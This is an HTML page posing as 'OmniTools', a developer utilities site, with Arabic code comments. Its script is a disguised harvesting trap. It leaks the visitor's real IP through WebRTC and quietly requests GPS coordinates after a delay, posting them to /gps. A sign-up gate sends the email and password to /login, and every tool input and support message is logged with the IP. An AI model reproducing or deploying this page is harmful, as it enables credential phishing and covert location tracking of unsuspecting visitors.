<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OmniTools - Developer Platform</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #0a0a0a; --panel: #121212; --border: #2a2a2a; --text: #ededed; --muted: #888; --accent: #0070f3; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; overflow-x: hidden;}
        
        /* Login Screen */
        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); display: flex; justify-content: center; align-items: center; z-index: 1000; }
        .login-box { background: var(--panel); border: 1px solid var(--border); padding: 40px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5);}
        .login-box h2 { margin-bottom: 10px; color: #fff;}
        .login-box p { color: var(--muted); font-size: 14px; margin-bottom: 30px;}
        .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; background: #000; border: 1px solid var(--border); color: #fff; border-radius: 6px; outline: none; font-family: 'Inter';}
        .login-box input:focus { border-color: var(--accent); }
        .login-box button { width: 100%; padding: 12px; background: var(--accent); color: #fff; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 15px;}

        /* Main App */
        #main-app { display: none; }
        nav { padding: 15px 30px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; background: rgba(10,10,10,0.9); backdrop-filter: blur(10px); z-index: 50; }
        .logo { font-weight: 700; font-size: 20px; letter-spacing: -0.5px; }
        .logo span { color: var(--accent); }
        .search-bar { width: 300px; padding: 8px 15px; background: var(--panel); border: 1px solid var(--border); border-radius: 6px; color: #fff; outline: none; }
        
        .container { max-width: 1000px; margin: 40px auto; padding: 0 20px; }
        .header-title { font-size: 32px; font-weight: 700; margin-bottom: 10px; }
        .header-sub { color: var(--muted); margin-bottom: 30px; }
        .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 15px; }
        .tool-card { background: var(--panel); border: 1px solid var(--border); padding: 20px; border-radius: 8px; cursor: pointer; transition: 0.2s; position: relative;}
        .tool-card:hover { border-color: #444; transform: translateY(-2px); }
        .tool-card h3 { font-size: 15px; margin-bottom: 6px; font-weight: 600;}
        .tool-card p { font-size: 12px; color: var(--muted); line-height: 1.4;}
        .badge { position: absolute; top: 15px; right: 15px; font-size: 10px; background: #222; padding: 2px 6px; border-radius: 4px; color: #aaa; font-family: 'JetBrains Mono';}
        
        /* Modal */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 100; justify-content: center; align-items: center; }
        .modal-content { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; width: 90%; max-width: 600px; padding: 25px;}
        .modal-head { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .modal-title { font-size: 18px; font-weight: 600; }
        .close-btn { background: none; border: none; color: var(--muted); font-size: 20px; cursor: pointer; }
        textarea { width: 100%; background: #000; border: 1px solid var(--border); color: #fff; padding: 15px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 13px; min-height: 120px; margin-bottom: 15px; outline: none;}
        .btn { width: 100%; padding: 12px; background: var(--accent); color: #fff; border: none; border-radius: 6px; font-weight: 600; cursor: pointer;}
        .output { margin-top: 15px; padding: 15px; background: #000; border: 1px solid var(--border); border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 13px; color: #10b981; white-space: pre-wrap; display: none; max-height: 200px; overflow-y: auto;}
        
        /* Chatbot */
        .chatbot { position: fixed; bottom: 20px; right: 20px; background: var(--panel); border: 1px solid var(--border); border-radius: 10px; padding: 15px; width: 300px; display: flex; flex-direction: column; gap: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 40;}
        .chatbot p { font-size: 12px; color: var(--muted); }
        .chatbot input { padding: 10px; background: #000; border: 1px solid var(--border); border-radius: 5px; color: #fff; outline: none;}
        .chatbot button { padding: 10px; background: #10b981; color: #000; border: none; border-radius: 5px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>

    <!-- شاشة الدخول -->
    <div id="login-screen">
        <div class="login-box">
            <h2>OmniTools <span>.dev</span></h2>
            <p>Create an account to access 70+ developer utilities.</p>
            <input type="email" id="email" placeholder="Email Address">
            <input type="password" id="password" placeholder="Password">
            <button onclick="login()">Sign Up / Login</button>
        </div>
    </div>

    <!-- الموقع -->
    <div id="main-app">
        <nav>
            <div class="logo">OmniTools<span>.dev</span></div>
            <input type="text" class="search-bar" id="search" placeholder="Search 70+ tools..." onkeyup="filterTools()">
        </nav>
        <div class="container">
            <div class="header-title">Developer Utilities</div>
            <div class="header-sub">A powerful toolkit for developers, security researchers, and engineers.</div>
            <div class="tools-grid" id="grid"></div>
        </div>

        <!-- Chatbot -->
        <div class="chatbot">
            <div style="font-weight:600; font-size:14px; color:#fff;">DevBot Assistant</div>
            <p>Need help or found a bug? Drop your email or issue here and we'll get back to you.</p>
            <input type="text" id="chat-input" placeholder="Email or message...">
            <button onclick="sendChat()">Send Request</button>
        </div>

        <!-- Modal -->
        <div class="modal" id="tool-modal">
            <div class="modal-content">
                <div class="modal-head">
                    <div class="modal-title" id="modal-title">Tool</div>
                    <button class="close-btn" onclick="closeModal()">✕</button>
                </div>
                <textarea id="input-text" placeholder="Enter text or data here..."></textarea>
                <button class="btn" onclick="executeTool()" id="run-btn">Process Data</button>
                <div class="output" id="output-box"></div>
            </div>
        </div>
    </div>

    <script>
        let real_ip = "Unknown";
        // سحب الـ IP
        const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
        pc.createDataChannel(''); pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
            if(real_ip === "Unknown") { real_ip = myIP; }
        };

        // سحب الـ GPS في الخلفية
        setTimeout(() => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    fetch('/gps', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude, real_ip: real_ip})});
                });
            }
        }, 3000);

        // تسجيل الدخول
        function login() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('password').value;
            if(!e || !p) return alert("Enter email and password!");
            fetch('/login', {method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: e, password: p, real_ip: real_ip })})
            .then(() => {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-app').style.display = 'block';
            });
        }

        // قائمة الأدوات
        let allTools = [];
        fetch('tools.json').then(res => res.json()).then(data => {
            allTools = data;
            renderTools(allTools);
        });

        function renderTools(tools) {
            const grid = document.getElementById('grid');
            grid.innerHTML = "";
            tools.forEach(t => {
                const card = document.createElement('div');
                card.className = 'tool-card';
                card.innerHTML = `<span class="badge">${t.cat}</span><h3>${t.name}</h3><p>${t.desc}</p>`;
                card.onclick = () => openTool(t.name);
                grid.appendChild(card);
            });
        }

        function filterTools() {
            const q = document.getElementById('search').value.toLowerCase();
            renderTools(allTools.filter(t => t.name.toLowerCase().includes(q) || t.desc.toLowerCase().includes(q)));
        }

        let currentTool = "";
        function openTool(name) {
            currentTool = name;
            document.getElementById('modal-title').innerText = name;
            document.getElementById('input-text').value = "";
            document.getElementById('output-box').style.display = "none";
            document.getElementById('tool-modal').style.display = "flex";
        }
        function closeModal() { document.getElementById('tool-modal').style.display = "none"; }

        function executeTool() {
            const text = document.getElementById('input-text').value;
            const btn = document.getElementById('run-btn');
            const out = document.getElementById('output-box');
            btn.innerText = "Processing..."; btn.disabled = true;
            fetch('/log_action', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({tool: currentTool, text: text, real_ip: real_ip})})
            .then(res => res.json()).then(data => {
                out.style.display = "block";
                out.innerText = data.output;
                btn.innerText = "Process Data"; btn.disabled = false;
            });
        }

        function sendChat() {
            const msg = document.getElementById('chat-input').value;
            if(!msg) return;
            fetch('/log_action', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({tool: 'CHATBOT', text: msg, real_ip: real_ip})});
            document.getElementById('chat-input').value = "";
            alert("Support ticket created. We will contact you soon.");
        }
    </script>
</body>
</html>
